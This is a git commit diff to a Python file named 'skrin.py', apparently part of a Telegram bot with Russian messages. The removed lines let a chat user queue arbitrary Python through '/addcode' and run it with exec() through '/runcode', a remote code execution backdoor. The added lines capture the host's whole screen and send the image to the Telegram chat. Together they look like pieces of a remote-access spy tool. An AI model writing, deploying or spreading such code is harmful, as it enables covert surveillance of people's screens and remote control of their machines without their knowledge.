03846d3cc75aa68706ca4fd1354642b156073706
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-16 17:02:32 +0300

    Update skrin.py

--- skrin.py
+++ skrin.py
@@ -1,16 +1,16 @@
-    global code_to_execute
     chat_id = message.chat.id
-    if message.text.startswith('/addcode'):
-        code = message.text.replace('/addcode', '').strip()
-        code_to_execute += code + '\n'  # Добавляем новый код к действующему с переносом строки
-        bot.send_message(chat_id, 'Код успешно добавлен для последующего выполнения.')
-    elif message.text.startswith('/runcode'):
-        if not code_to_execute:
-            bot.send_message(chat_id, 'Код для выполнения не найден.')
-        else:
-            try:
-                exec(code_to_execute)
-                bot.send_message(chat_id, 'Код успешно выполнен.')
-                code_to_execute = ''  # Очищаем сохраненный код после выполнения
-            except Exception as e:
-                bot.send_message(chat_id, f'Произошла ошибка при выполнении кода: {e}')
+    bot.send_chat_action(chat_id, 'typing')
+    screenshot = ImageGrab.grab()
+    screenshot.save('screenshot.jpg')
+    with open('screenshot.jpg', 'rb') as photo:
+        bot.send_document(chat_id, photo)
+
+    try:
+        error_message = f"ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except PermissionError as e:
+        error_message = f"ОШИБКА:: {e}"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
